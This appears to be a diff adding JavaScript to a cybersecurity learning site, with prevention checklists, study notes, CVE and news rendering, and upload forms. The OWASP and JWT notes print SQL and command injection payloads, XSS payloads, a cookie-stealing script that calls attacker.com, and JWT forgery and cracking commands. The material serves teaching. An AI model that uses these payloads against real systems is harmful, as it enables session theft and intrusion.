Access",icon:"&#128187;",bg:"rgba(255,45,120,.1)",sev:98,steps:["Apply security patches within 24 hours of release for critical CVEs","Restrict management interfaces to trusted IP ranges via firewall rules","Disable default credentials immediately after installation","Enable SELinux or AppArmor mandatory access controls","Use Web Application Firewalls in front of all internet-facing applications","Implement network segmentation so compromised servers cannot reach internal systems","Run services as dedicated low-privilege users - never run web services as root"]},{name:"SQL Injection and Database Attacks",icon:"&#128137;",bg:"rgba(255,200,60,.1)",sev:92,steps:["Use parameterized queries and prepared statements - NEVER concatenate user input into SQL","Implement input validation with a whitelist approach","Deploy a WAF with SQL injection rules such as ModSecurity CRS","Restrict database user permissions using least privilege","Enable database activity monitoring and alert on unusual query patterns","Regularly test with SQLMap in authorized penetration tests"]},{name:"DDoS and Service Disruption",icon:"&#127754;",bg:"rgba(0,212,255,.1)",sev:85,steps:["Deploy CDN services like Cloudflare or AWS CloudFront to absorb volumetric DDoS attacks","Implement rate limiting at the load balancer and application layer","Use anycast routing to distribute traffic across multiple geographically distributed servers","Configure connection limits and timeout values in nginx and Apache","Enable SYN cookies to handle TCP SYN flood attacks","Deploy IPS with Suricata or Snort using DDoS detection rules"]},{name:"Privilege Escalation and Persistence",icon:"&#128200;",bg:"rgba(168,85,247,.1)",sev:88,steps:["Run rkhunter and chkrootkit weekly to detect rootkits","Audit SUID binaries with find / -perm /4000 -type f","Monitor cron jobs, systemd services, and startup scripts for unauthorized persistence","Use Lynis to run comprehensive security audits","Enable file integrity monitoring with AIDE or Tripwire","Enforce no-root SSH login and use key-based authentication only"]}],iot:[{name:"Default Credential Exploitation",icon:"&#128273;",bg:"rgba(255,45,120,.1)",sev:95,steps:["Change default usernames and passwords on EVERY IoT device immediately after unboxing - Mirai botnet still compromises millions with default credentials","Use a unique strong password of 16+ characters for each device","Disable Telnet and use SSH with key-based authentication where firmware supports it","Place IoT devices on a separate VLAN to isolate them from PCs and critical systems","Check router connected device list regularly and block devices from internet access unless required","Use Shodan to check if your devices are accidentally exposed to the internet"]},{name:"Firmware Vulnerabilities",icon:"&#9881;",bg:"rgba(255,200,60,.1)",sev:88,steps:["Enable automatic firmware updates if available","If auto-update unavailable, manually check manufacturer websites monthly for security updates","Replace end-of-life IoT devices that no longer receive security patches","Disable UPnP on your router - IoT devices use UPnP to punch holes in your firewall","Check for devices exposed via UPnP by searching your WAN IP on Shodan","Physically secure IoT devices - some firmware extraction attacks require physical access to debug ports"]}],network:[{name:"Man-in-the-Middle Attacks",icon:"&#128373;",bg:"rgba(0,212,255,.1)",sev:90,steps:["Enforce HTTPS everywhere using Let's Encrypt for free TLS certificates","Implement HSTS with preloading to prevent SSL strip attacks","Enable 802.1X port-based network access control on enterprise WiFi","Enable Dynamic ARP Inspection on managed switches to prevent ARP poisoning","Use encrypted DNS with DNS over HTTPS or DNS over TLS","Monitor for duplicate ARP replies indicating ARP poisoning attacks"]},{name:"Network Scanning and Reconnaissance",icon:"&#128301;",bg:"rgba(168,85,247,.1)",sev:75,steps:["Deploy a SIEM to correlate suspicious network scan activity","Implement network-level rate limiting to detect and throttle port scans","Enable firewall logging and alert on unusual inbound connection patterns","Deploy honeypots using Canary Tokens - legitimate traffic never touches honeypots","Segment networks using VLANs and ACLs to limit lateral movement","Regularly audit firewall rules - overly permissive rules accumulate over time"]},{name:"DNS Hijacking and Cache Poisoning",icon:"&#127760;",bg:"rgba(127,255,0,.1)",sev:82,steps:["Use DNSSEC to cryptographically sign DNS records","Configure DNS resolvers to use only trusted upstream resolvers with DNSSEC validation","Monitor DNS logs for unusual queries especially DGA patterns","Implement split-horizon DNS for internal services","Use Quad9 9.9.9.9 as a DNS resolver - blocks known malicious domains","Regularly verify your domain registrar account security with strong 2FA"]}]};
+
+var NOTES=[{id:"n1",cat:"networking",catL:"Networking",icon:"&#127760;",title:"OSI Model and TCP/IP Deep Dive",level:"beginner",dur:"45 min read",sum:"Complete breakdown of the 7-layer OSI model and TCP/IP stack - essential foundation for all cybersecurity work.",body:'<h5>OSI Model Layers and Attack Mapping</h5><p>Every attack and defense maps to specific OSI layers. Understanding these layers tells you WHERE an attack happens and what defenses apply.</p><ul><li>Layer 1 Physical: Cable tapping, RF jamming, hardware implants</li><li>Layer 2 Data Link: ARP poisoning, MAC spoofing, VLAN hopping attacks</li><li>Layer 3 Network: IP spoofing, routing attacks, ICMP attacks</li><li>Layer 4 Transport: TCP SYN floods, port scanning, session hijacking</li><li>Layer 5 Session: Session fixation and hijacking attacks</li><li>Layer 6 Presentation: SSL stripping, certificate attacks</li><li>Layer 7 Application: SQL injection, XSS, CSRF, buffer overflows</li></ul><h5>TCP 3-Way Handshake</h5><div class="ncode">Client SENDS SYN to Server\nServer SENDS SYN-ACK to Client\nClient SENDS ACK to Server\nConnection Established\n\nSYN Flood Attack:\nAttacker sends thousands of SYN packets with spoofed source IPs\nServer runs out of connection table space = Denial of Service</div><h5>Key Ports for Bug Bounty</h5><div class="ncode">21  - FTP (often anonymous login enabled)\n22  - SSH (brute force target)\n23  - Telnet (cleartext credentials)\n25  - SMTP (open relay, email spoofing)\n53  - DNS (zone transfer, cache poisoning)\n80  - HTTP (web app attacks)\n443 - HTTPS\n445 - SMB (ransomware lateral movement)\n3389- RDP (brute force, BlueKeep)\n8080/8443 - Alternative HTTP/HTTPS</div>'},{id:"n2",cat:"web",catL:"Web Security",icon:"&#128375;",title:"OWASP Top 10 2026 Complete Guide",level:"intermediate",dur:"2 hour read",sum:"Master all OWASP Top 10 vulnerabilities with examples, payloads, and prevention. Essential for web bug bounty.",body:'<h5>A01: Broken Access Control</h5><p>Most critical web vulnerability category. IDOR is the most common subtype and very commonly found in bug bounty programs.</p><div class="ncode">IDOR Example:\n/api/user/profile?id=1234\nChange to: /api/user/profile?id=1235\nIf you see another users profile - Critical IDOR finding!\n\nBroken Function Level Access:\nGET /api/admin/users/delete/123\nAuthorization: Bearer REGULAR_USER_TOKEN\nIf you get 200 OK - Broken Access Control!</div><h5>A03: Injection - SQL, Command, LDAP</h5><div class="ncode">SQL Injection Payloads:\n1 OR 1=1\n1 OR 1=1--\n1 UNION SELECT 1,2,3--\n1 UNION SELECT username,password,NULL FROM users--\n\nCommand Injection:\n; whoami\n| id\n$(id)\n\nAutomate with sqlmap:\nsqlmap -u http://target.com/?id=1 --dbs</div><h5>A07: Cross-Site Scripting</h5><div class="ncode">Basic XSS Payloads:\n&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&lt;svg onload=alert(1)&gt;\n\nCookie Stealing:\n&lt;script&gt;fetch(\'https://attacker.com/c=\'+document.cookie)&lt;/script&gt;\n\nDOM XSS sinks to check:\ndocument.write() innerHTML eval()\nlocation.href location.hash</div>'},{id:"n3",cat:"tools",catL:"Security Tools",icon:"&#128296;",title:"Nmap Mastery - Complete Reference",level:"beginner",dur:"1 hour read",sum:"Every Nmap flag, scan type, NSE script, and technique for bug bounty reconnaissance.",body:'<h5>Nmap Scan Types</h5><div class="ncode">SYN Scan - Most Common - requires root:\nsudo nmap -sS target.com\n\nTCP Connect - No root needed:\nnmap -sT target.com\n\nUDP Scan - Often overlooked:\nsudo nmap -sU -p 53,67,68,123,137,161 target.com\n\nService and Version Detection:\nnmap -sV target.com\n\nAggressive All-in-One:\nsudo nmap -A -T4 target.com\n\nFull Port Scan:\nnmap -p- target.com</div><h5>NSE Scripting Engine</h5><div class="ncode">Vulnerability Scanning:\nnmap --script vuln target.com\n\nHTTP Enumeration:\nnmap --script http-enum target.com\n\nSMB EternalBlue Check:\nnmap --script smb-vuln-ms17-010 -p 445 target.com\n\nAll scripts in categories:\nnmap --script=default,vuln,auth target.com</div><h5>Timing Templates</h5><div class="ncode">-T0 Paranoid  - IDS evasion - very slow\n-T1 Sneaky    - slow\n-T2 Polite    - avoid overloading target\n-T3 Normal    - default\n-T4 Aggressive- fast, reliable network\n-T5 Insane    - very fast, may miss results</div>'},{id:"n4",cat:"web",catL:"Web Security",icon:"&#128272;",title:"JWT Attacks Complete Reference",level:"intermediate",dur:"1 hour read",sum:"Algorithm confusion, none algorithm, weak secrets, JWK injection attacks against JSON Web Tokens.",body:'<h5>JWT Structure</h5><div class="ncode">JWT = Header.Payload.Signature (base64url encoded)\n\nDecode header:\necho eyJhbGciOiJIUzI1NiJ9 | base64 -d\nResult: {"alg":"HS256"}\n\nDecode payload:\necho eyJ1c2VyIjoiYWRtaW4ifQ | base64 -d\nResult: {"user":"admin"}</div><h5>Attack 1: None Algorithm</h5><div class="ncode">Change algorithm to none and remove signature\n\nStep 1: Decode the JWT at jwt.io\nStep 2: Modify header to {"alg":"none","typ":"JWT"}\nStep 3: Modify payload to escalate privileges\nStep 4: Re-encode with empty signature\n\nResult: header.payload.\n\nIf server accepts this - Critical Authentication Bypass!</div><h5>Attack 2: Algorithm Confusion RS256 to HS256</h5><div class="ncode">If server uses RS256 the public key is public!\nTrick the server into using HS256\nSign the token with the PUBLIC KEY as the HMAC secret\n\nTool: jwt_tool.py\npython3 jwt_tool.py JWT_TOKEN -X k -pk public.pem</div><h5>Attack 3: Weak Secret Cracking</h5><div class="ncode">Crack HS256 tokens with known wordlists:\nhashcat -a 0 -m 16500 jwt.txt rockyou.txt\n\nCommon weak secrets:\nsecret password 1234 key jwt_secret\nyour-256-bit-secret mysecret changeme</div>'},{id:"n5",cat:"bugbounty",catL:"Bug Bounty",icon:"&#128176;",title:"Bug Bounty Hunter Methodology",level:"intermediate",dur:"2 hour read",sum:"Full step-by-step recon-to-report methodology used by top earners. Automation and report writing.",body:'<h5>Reconnaissance Phase - The Foundation</h5><p>80% of bug bounty success comes from thorough recon. Most hunters skip this and find nothing.</p><div class="ncode">Subdomain Enumeration:\nsubfinder -d target.com -o subdomains.txt\namass enum -d target.com >> subdomains.txt\nassetfinder target.com >> subdomains.txt\n\nLive Host Detection:\nhttpx -l subdomains.txt -o live.txt\n\nDirectory Bruteforce:\nffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,403</div><h5>Vulnerability Priority by Payout</h5><div class="ncode">P1 Critical - 5000 to 50000+ USD:\nRCE Remote Code Execution\nSQL injection with data dump\nAuthentication bypass on production\nSSRF with internal network access\n\nP2 High - 1000 to 10000 USD:\nStored XSS in high-impact location\nIDOR accessing sensitive user data\nPrivilege escalation to admin\n\nP3 Medium - 500 to 2000 USD:\nReflected XSS\nCSRF on sensitive action\nInformation disclosure of credentials</div><h5>Writing Reports That Get Paid</h5><div class="ncode">Template:\nTitle: [Vuln Type] in [Component] allows [Impact]\nSeverity: Critical\n\nSummary:\nOne paragraph - what, where, and impact.\n\nSteps to Reproduce:\n1. Navigate to https://target.com/endpoint\n2. Enter payload: YOUR_EXACT_PAYLOAD\n3. Observe: EXACT_OBSERVABLE_BEHAVIOR\n\nImpact:\nWorst case scenario for the business.\n\nProof of Concept:\nScreenshots, video, exact request and response.</div>'},{id:"n6",cat:"cryptography",catL:"Cryptography",icon:"&#128272;",title:"Cryptography Fundamentals for Pentesters",level:"intermediate",dur:"90 min read",sum:"Symmetric, asymmetric, hashing, TLS, JWT - find and exploit cryptographic failures.",body:'<h5>Symmetric vs Asymmetric</h5><div class="ncode">Symmetric - same key encrypts and decrypts:\nAES-256-CBC - secure industry standard\nAES-128-ECB - VULNERABLE - ECB mode leaks patterns!\nDES and 3DES - DEPRECATED - brute-forceable\nRC4 - BROKEN - use in SSL/TLS is a critical finding\n\nAsymmetric - public and private key pair:\nRSA-2048 - minimum secure, prefer RSA-4096\nRSA-1024 - BROKEN - factorable with modern hardware\nEC P-256  - modern secure elliptic curve cryptography</div><h5>Hash Functions</h5><div class="ncode">SECURE:\nbcrypt with cost 12+ for passwords\nargon2id - 2026 recommended for passwords\nSHA-256 and SHA-3 for file integrity\n\nBROKEN - never use for security:\nMD5 - collision attacks proven and trivial\nSHA-1 - collision demonstrated by SHAttered attack\n\nCrack hashes:\nhashid HASH_STRING\nhashcat -m 0 hash.txt rockyou.txt</div><h5>TLS Vulnerabilities to Test</h5><div class="ncode">Test TLS configuration:\nsslscan target.com\ntestssl.sh target.com\n\nVulnerabilities:\nPOODLE  - SSLv3 vulnerability\nBEAST   - TLS 1.0 + CBC mode\nCRIME   - compression oracle attack\nROBOT   - RSA PKCS1 padding oracle</div>'},{id:"n7",cat:"malware",catL:"Malware Analysis",icon:"&#129440;",title:"Malware Analysis Methodology",level:"advanced",dur:"3 hour read",sum:"Static and dynamic analysis, sandbox usage, IOC extraction, and memory forensics.",body:'<h5>Static Analysis - No Execution</h5><div class="ncode">Step 1: Calculate hash - never trust filenames\nmd5sum malware.exe\nsha256sum malware.exe\n\nStep 2: Check VirusTotal\ncurl https://www.virustotal.com/api/v3/files/SHA256_HASH\n\nStep 3: String extraction\nstrings malware.exe | grep -E "http|cmd|powershell|.exe"\n\nStep 4: Suspicious imports to look for\nCreateRemoteThread  - process injection\nWriteProcessMemory  - code injection\nVirtualAllocEx      - remote memory allocation\nRegSetValueEx       - registry persistence\nShellExecuteA       - command execution</div><h5>Dynamic Analysis</h5><div class="ncode">Setup: Isolated VM - NO internet connection\n\nTools to run BEFORE executing malware:\nProcmon.exe /Quiet /BackingFile activity.pml\nWireshark.exe -i 1 -w network.pcap\nautorunsc.exe -accepteula -a * -c > before.csv\n\nExecute malware then check:\nautorunsc.exe -accepteula -a * -c > after.csv\ndiff before.csv after.csv</div><h5>Memory Forensics with Volatility</h5><div class="ncode">vol3 -f memory.raw windows.pslist\nvol3 -f memory.raw windows.malfind\nvol3 -f memory.raw windows.netscan\nvol3 -f memory.raw windows.cmdline\nvol3 -f memory.raw windows.dumpfiles</div>'},{id:"n8",cat:"forensics",catL:"Digital Forensics",icon:"&#128300;",title:"Digital Forensics and Incident Response",level:"advanced",dur:"2 hour read",sum:"DFIR methodology, evidence collection, log analysis, and Windows artifact locations.",body:'<h5>Order of Volatility - Collect in This Order</h5><div class="ncode">1. CPU registers and cache (most volatile)\n2. RAM memory dump\n3. Network connections and routing state\n4. Running processes and handles\n5. Disk filesystem\n6. Logs and audit trails\n7. Physical configuration (least volatile)\n\nNEVER reboot the machine first\nNEVER run antivirus on the infected system\nDO take RAM dump immediately</div><h5>Windows Artifact Locations</h5><div class="ncode">Prefetch:\nC:\\Windows\\Prefetch\\*.pf\n\nWindows Event Logs:\nC:\\Windows\\System32\\winevt\\Logs\\\n\nKey Event IDs:\n4624 - Successful logon\n4625 - Failed logon\n4672 - Special privileges assigned\n4688 - Process creation\n4698 - Scheduled task created</div>'}];
+
+var PENDING_SUBS=[{id:"ps1",type:"CVE",title:"CVE-2026-45123 Apache Struts RCE",author:"r3d_l0gic",date:"May 13, 2026"},{id:"ps2",type:"Tool",title:"Shodan-CLI v2.1 Enhanced Queries",author:"netprowler99",date:"May 12, 2026"},{id:"ps3",type:"News",title:"Telecom Breach T-Mobile Data Exposed",author:"secthreat_io",date:"May 11, 2026"}];
+
+var popTimer=null,lastPopTime=0,cveVisits=0;
+function showPop(){var pop=document.getElementById('eduPop'),btn=document.getElementById('popBtn'),cdNum=document.getElementById('cdNum'),fill=document.getElementById('popFill');pop.classList.add('on');btn.disabled=true;var t=10;cdNum.textContent=t;fill.style.width='100%';if(popTimer)clearInterval(popTimer);popTimer=setInterval(function(){t--;cdNum.textContent=t;fill.style.width=(t*10)+'%';if(t<=0){clearInterval(popTimer);btn.disabled=false;document.getElementById('popCd').textContent='You may now proceed.'}},1000);lastPopTime=Date.now();}
+function closePop(){document.getElementById('eduPop').classList.remove('on');}
+setInterval(function(){if(lastPopTime>0&&(Date.now()-lastPopTime)>=600000)showPop();},60000);
+
+function openPanel(name){document.querySelectorAll('.overlay').forEach(function(o){o.classList.remove('on');});var el=document.getElementById('ov-'+name);if(el){el.classList.add('on');document.body.style.overflow='hidden';}if(name==='tools')renderTools('kali');if(name==='news')renderNews();if(name==='prev')renderPrev('mobile');if(name==='notes'){renderNotes();renderNoteCats();}if(name==='upload')initUpload();}
+function openCVE(){cveVisits++;if(cveVisits===1||(Date.now()-lastPopTime)>=600000)showPop();openPanel('cve');renderCVEs();}
+function closePanel(name){var el=document.getElementById('ov-'+name);if(el)el.classList.remove('on');document.body.style.overflow='';}
+document.querySelectorAll('.overlay').forEach(function(el){el.addEventListener('click',function(e){if(e.target===this){this.classList.remove('on');document.body.style.overflow='';}});});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'){document.querySelectorAll('.overlay.on').forEach(function(o){o.classList.remove('on');});document.body.style.overflow='';closePop();}});
+
+function selOS(os,btn){document.querySelectorAll('.os-btn').forEach(function(b){b.classList.remove('on');});btn.classList.add('on');renderTools(os);}
+function renderTools(os){var list=TOOLS[os]||[];var g=document.getElementById('toolsG');if(!list.length){g.innerHTML='<p style="color:var(--text3);font-family:var(--font-mono);padding:2rem;">No tools for this OS.</p>';return;}var html='';for(var i=0;i<list.length;i++){var t=list[i];var tagHtml='';for(var j=0;j<t.tags.length;j++){tagHtml+='<span class="tg tg-'+t.tags[j]+'">'+t.tags[j]+'</span>';}html+='<div class="tool-c"><div class="tool-h"><div class="tool-ic">'+t.icon+'</div><div><div class="tool-nm">'+t.name+'</div><div class="tool-ct ct-'+t.cat+'">'+t.catL+'</div></div></div><div class="tool-b"><div class="tool-desc">'+t.desc+'</div><div class="code-box"><div class="code-lbl">Usage / Install</div><div class="code-txt">'+escH(t.usage)+'</div></div><div class="code-box"><div class="code-lbl">Example Commands</div><div class="code-txt">'+escH(t.install)+'</div></div><div class="code-box"><div class="code-lbl">Technical Notes</div><div class="code-txt">'+escH(t.detail)+'</div></div><div class="tags">'+tagHtml+'</div></div></div>';}g.innerHTML=html;}
+
+var badgeMap={crit:'nb-crit',high:'nb-high',med:'nb-med',info:'nb-info'};
+var badgeLbl={crit:'CRITICAL',high:'HIGH',med:'MEDIUM',info:'INFO'};
+function renderNews(){var g=document.getElementById('newsG');var filterBar=document.getElementById('newsFilterBar');if(!filterBar){filterBar=document.createElement('div');filterBar.id='newsFilterBar';filterBar.style.cssText='display:flex;gap:.6rem;margin-bottom:1.5rem;flex-wrap:wrap;';var filters=['ALL','CRITICAL','HIGH','MEDIUM','INFO'];filters.forEach(function(f){var btn=document.createElement('button');btn.textContent=f;btn.className='cve-fb'+(f==='ALL'?' on':'');btn.onclick=function(){document.querySelectorAll('#newsFilterBar .cve-fb').forEach(function(b){b.classList.remove('on');});btn.classList.add('on');filterNewsByBadge(f);};filterBar.appendChild(btn);});g.parentNode.insertBefore(filterBar,g);}var html='';for(var i=0;i<NEWS.length;i++){var n=NEWS[i];var badgeCls=badgeMap[n.badge]||'nb-info';var badgeTxt=badgeLbl[n.badge]||n.badge.toUpperCase();html+='<div class="news-c" data-badge="'+n.badge+'"><div class="news-meta"><span class="news-dt">&#128197; '+n.date+' - '+n.time+'</span><span class="nbadge '+badgeCls+'">'+badgeTxt+'</span></div><div class="news-ttl">'+n.title+'</div><div class="news-sum">'+n.sum+'</div><div class="news-src"><span class="sdot"></span>'+n.src+'</div></div>';}g.innerHTML=html;}
+function filterNewsByBadge(f){var cards=document.querySelectorAll('#newsG .news-c');var map={ALL:null,CRITICAL:'crit',HIGH:'high',MEDIUM:'med',INFO:'info'};var target=map[f];cards.forEach(function(c){c.style.display=(!target||c.dataset.badge===target)?'':'none';});}
+
+var activeSevFilter='all';
+function filterCVEs(){var q=document.getElementById('cveInp').value.toLowerCase();renderCVEs(q,activeSevFilter);}
+function setSevFilter(sev,btn){document.querySelectorAll('.cve-fb').forEach(function(b){b.classList.remove('on');});btn.classList.add('on');activeSevFilter=sev;filterCVEs();}
+function renderCVEs(q,sev){q=q||'';sev=sev||'all';var list=document.getElementById('cveList');var html='';var shown=0;for(var i=0;i<CVES.length;i++){var c=CVES[i];var txt=(c.id+c.title+c.prod+c.tags.join(' ')).toLowerCase();var matchQ=!q||txt.indexOf(q)!==-1;var matchS=sev==='all'||c.sev===sev||c.tags.indexOf(sev)!==-1;if(!matchQ||!matchS)continue;shown++;var cvssClass=c.sev==='CRITICAL'?'cvss-crit':(c.sev==='HIGH'?'cvss-high':'cvss-med');var tagHtml='';for(var j=0;j<c.tags.length;j++){tagHtml+='<span style="font-family:var(--font-mono);font-size:.6rem;background:rgba(0,212,255,.08);color:var(--accent);border:1px solid rgba(0,212,255,.2);padding:2px 8px;border-radius:3px;margin:2px;">'+c.tags[j]+'</span>';}var refHtml='';for(var k=0;k<c.refs.length;k++){refHtml+='<a class="ref-a" href="'+c.refs[k]+'" target="_blank">&#128279; '+c.refs[k].replace('https://','').split('/')[0]+'</a>';}html+='<div class="cve-row" id="cver-'+c.id+'"><div class="cve-rhdr" onclick="toggleCVE(\''+c.id+'\')"><span class="cve-id">'+c.id+'</span><span class="cvss-b '+cvssClass+'">'+c.sev+' CVSS '+c.cvss+'</span><span class="cve-rtitle">'+c.title+'</span><span class="cve-rdate">'+c.pub+'</span><span style="color:var(--text3);font-size:.75rem;">&#9660;</span></div><div class="cve-detail" id="cvd-'+c.id+'"><div class="edu-warn"><span class="ew-icon">&#127891;</span><div class="ew-txt"><strong>RESEARCH USE ONLY:</strong> The following is an educational overview of this vulnerability for authorized security research, CTF challenges, and legitimate penetration testing engagements only.</div></div><div class="cve-dgrid"><div class="cve-di"><label>CVE ID</label><span style="color:var(--accent);font-family:var(--font-mono)">'+c.id+'</span></div><div class="cve-di"><label>Severity</label><span>'+c.sev+'</span></div><div class="cve-di"><label>CVSS Score</label><span>'+c.cvss+' / 10</span></div><div class="cve-di"><label>CWE</label><span>'+c.cwe+'</span></div><div class="cve-di"><label>Affected Product</label><span>'+c.prod+'</span></div><div class="cve-di"><label>Vendor</label><span>'+c.vendor+'</span></div><div class="cve-di"><label>Attack Vector</label><span>'+c.vector+'</span></div><div class="cve-di"><label>Auth Required</label><span>'+c.auth+'</span></div><div class="cve-di"><label>Published</label><span>'+c.pub+'</span></div></div><div class="cve-stitle">Technical Description</div><p style="font-size:.83rem;color:var(--text2);line-height:1.7;margin-bottom:.8rem;">'+c.desc+'</p><div class="cve-stitle">Impact Assessment</div><p style="font-size:.83rem;color:var(--text2);line-height:1.7;margin-bottom:.8rem;">'+c.impact+'</p><div class="cve-stitle">Remediation and Mitigation</div><p style="font-size:.83rem;color:var(--text2);line-height:1.7;margin-bottom:.8rem;">'+c.fix+'</p><div class="cve-stitle">Exploitation Technique - Educational Skeleton</div><div class="expl-block">'+escH(c.expl)+'</div><div class="cve-stitle">Tags</div><div style="display:flex;flex-wrap:wrap;gap:4px;margin:.5rem 0;">'+tagHtml+'</div><div class="cve-stitle">References</div><div class="ref-row">'+refHtml+'</div></div></div>';}if(!shown)html='<p style="color:var(--text3);font-family:var(--font-mono);padding:2rem;">No CVEs match your search.</p>';list.innerHTML=html;}
+function toggleCVE(id){var d=document.getElementById('cvd-'+id);if(!d)return;d.classList.toggle('open');if(d.classList.contains('open')&&(Date.now()-lastPopTime)>=600000)showPop();}
+
+function selDev(dev,btn){document.querySelectorAll('.dev-btn').forEach(function(b){b.classList.remove('on');});btn.classList.add('on');renderPrev(dev);}
+function renderPrev(dev){var attacks=PREVENTION[dev]||[];var g=document.getElementById('prevG');var html='';for(var i=0;i<attacks.length;i++){var a=attacks[i];var liHtml='';for(var j=0;j<a.steps.length;j++){liHtml+='<li>'+a.steps[j]+'</li>';}var sevColor=a.sev>=90?'var(--red)':(a.sev>=75?'var(--yellow)':'var(--green)');html+='<div class="prev-c"><div class="prev-ch"><div class="atk-ic" style="background:'+a.bg+'">'+a.icon+'</div><div><h3>'+a.name+'</h3><div class="atk-type">Attack Type</div></div></div><div class="prev-cb"><div class="sev-bar"><span class="sev-lbl">Severity</span><div class="sev-track"><div class="sev-fill" style="width:'+a.sev+'%;background:'+sevColor+'"></div></div><span style="font-family:var(--font-mono);font-size:.6rem;color:var(--text3)">'+a.sev+'/100</span></div><ul class="prev-list">'+liHtml+'</ul></div></div>';}g.innerHTML=html||'<p style="color:var(--text3);font-family:var(--font-mono);">Select a device type above.</p>';}
+
+var activeNoteCat='all';
+function renderNoteCats(){var catMap={};for(var i=0;i<NOTES.length;i++){if(!catMap[NOTES[i].cat])catMap[NOTES[i].cat]={label:NOTES[i].catL,count:0};catMap[NOTES[i].cat].count++;}var html='<button class="ncat-btn '+(activeNoteCat==='all'?'on':'')+'" onclick="setNoteCat(\'all\')">All Topics <span class="ncat-cnt">'+NOTES.length+'</span></button>';for(var cat in catMap){html+='<button class="ncat-btn '+(activeNoteCat===cat?'on':'')+'" onclick="setNoteCat(\''+cat+'\')">'+catMap[cat].label+' <span class="ncat-cnt">'+catMap[cat].count+'</span></button>';}document.getElementById('noteCats').innerHTML=html;}
+function setNoteCat(cat){activeNoteCat=cat;renderNoteCats();renderNotes();}
+function filterNotes(){renderNotes();renderNoteCats();}
+var lvlMap={beginner:'lvl-beg',intermediate:'lvl-int',advanced:'lvl-adv'};
+function renderNotes(){var q=(document.getElementById('noteSrch').value||'').toLowerCase();var g=document.getElementById('notesG');var html='';for(var i=0;i<NOTES.length;i++){var n=NOTES[i];var txt=(n.title+n.sum+n.body).toLowerCase();var matchCat=activeNoteCat==='all'||n.cat===activeNoteCat;var matchQ=!q||txt.indexOf(q)!==-1;if(!matchCat||!matchQ)continue;html+='<div class="note-c" id="nc-'+n.id+'"><div class="note-ch" onclick="toggleNote(\''+n.id+'\')"><div class="note-ic">'+n.icon+'</div><div style="flex:1"><h4>'+n.title+'</h4><p>'+n.sum+'</p></div><span style="color:var(--text3);font-size:.75rem;flex-shrink:0">&#9660;</span></div><div class="note-meta"><span class="nlevel '+(lvlMap[n.level]||'lvl-beg')+'">'+n.level+'</span><span class="note-dur">&#8987; '+n.dur+'</span><span style="font-family:var(--font-mono);font-size:.6rem;color:var(--text3);margin-left:auto">'+n.catL+'</span></div><div class="note-body" id="nb-'+n.id+'">'+n.body+'</div></div>';}g.innerHTML=html||'<p style="color:var(--text3);font-family:var(--font-mono);">No notes match your search.</p>';}
+function toggleNote(id){var el=document.getElementById('nb-'+id);if(el)el.classList.toggle('open');}
+
+var curStep=0,selSection='';
+function initUpload(){curStep=0;[0,1,2,3].forEach(function(i){var el=document.getElementById('fs'+i);if(el){el.classList.remove('on');}});var s0=document.getElementById('fs0');if(s0)s0.classList.add('on');updateDots();}
+var sectionForms={tool:'<h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:1rem;">&#128296; Tool Details</h3><div class="f-grp"><label>Tool Name</label><input class="f-inp" type="text" placeholder="e.g., Nuclei v3"/></div><div class="f-grp"><label>Category</label><select class="f-sel"><option>Reconnaissance</option><option>Exploitation</option><option>Scanning</option><option>Web Security</option><option>Network Analysis</option><option>Password Cracking</option><option>Forensics</option></select></div><div class="f-grp"><label>Supported OS</label><input class="f-inp" type="text" placeholder="Kali, Linux, Windows, macOS, Android"/></div><div class="f-grp"><label>Install Command</label><textarea class="f-ta" style="min-height:70px" placeholder="sudo apt install toolname"></textarea></div><div class="f-grp"><label>Description</label><textarea class="f-ta" placeholder="Detailed description of the tool..."></textarea></div><div class="f-grp"><label>Usage Examples</label><textarea class="f-ta" placeholder="tool-name -target example.com"></textarea></div>',cve:'<h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:.5rem;">&#128128; CVE Details - 2026 Only</h3><div class="edu-warn" style="margin-bottom:1rem;"><span class="ew-icon">&#9888;&#65039;</span><div class="ew-txt"><strong>NOTE:</strong> Only submit 2026 CVEs. Educational context only.</div></div><div class="f-grp"><label>CVE ID (must be 2026)</label><input class="f-inp" type="text" placeholder="CVE-2026-XXXXX"/></div><div class="f-grp"><label>CVSS Score</label><input class="f-inp" type="number" min="0" max="10" step="0.1" placeholder="9.8"/></div><div class="f-grp"><label>Severity</label><select class="f-sel"><option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>LOW</option></select></div><div class="f-grp"><label>Affected Product</label><input class="f-inp" placeholder="e.g., Apache Struts 2.x"/></div><div class="f-grp"><label>Vulnerability Title</label><input class="f-inp" placeholder="e.g., Remote Code Execution via deserialization"/></div><div class="f-grp"><label>Technical Description</label><textarea class="f-ta" placeholder="Full technical description..."></textarea></div>',news:'<h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:1rem;">&#128225; News Details - 2026 Only</h3><div class="f-grp"><label>Headline</label><input class="f-inp" placeholder="Clear factual headline about the security event"/></div><div class="f-grp"><label>Date and Time</label><input class="f-inp" type="text" placeholder="May 14, 2026 - 10:00 UTC"/></div><div class="f-grp"><label>Severity</label><select class="f-sel"><option>CRITICAL</option><option>HIGH</option><option>MEDIUM</option><option>INFO</option></select></div><div class="f-grp"><label>Summary</label><textarea class="f-ta" placeholder="Brief factual summary..."></textarea></div><div class="f-grp"><label>Source URL</label><input class="f-inp" placeholder="https://securityweek.com/article..."/></div>',note:'<h3 style="font-family:var(--font-head);font-size:1.1rem;color:var(--text);margin-bottom:1rem;">&#128218; Study Notes Details</h3><div class="f-grp"><label>Topic Title</label><input class="f-inp" placeholder="e.g., Advanced XSS Bypass Techniques"/></div><div class="f-grp"><label>Category</label><select class="f-sel"><option>Networking</option><option>Web Security</option><option>Security Tools</option><option>Cryptography</option><option>Malware Analysis</option><option>Bug Bounty</option><option>Digital Forensics</option></select></div><div class="f-grp"><label>Difficulty Level</label><select class="f-sel"><option>Beginner</option><option>Intermediate</option><option>Advanced</option></select></div><div class="f-grp"><label>Summary</label><input class="f-inp" placeholder="What will the reader learn?"/></div><div class="f-grp"><label>Full Content</label><textarea class="f-ta" style="min-height:160px" placeholder="Write your educational content here..."></textarea></div>'};
+function chooseSection(sec){selSection=sec;var content=document.getElementById('fs1content');content.innerHTML=sectionForms[sec]||'';goStep(1);}
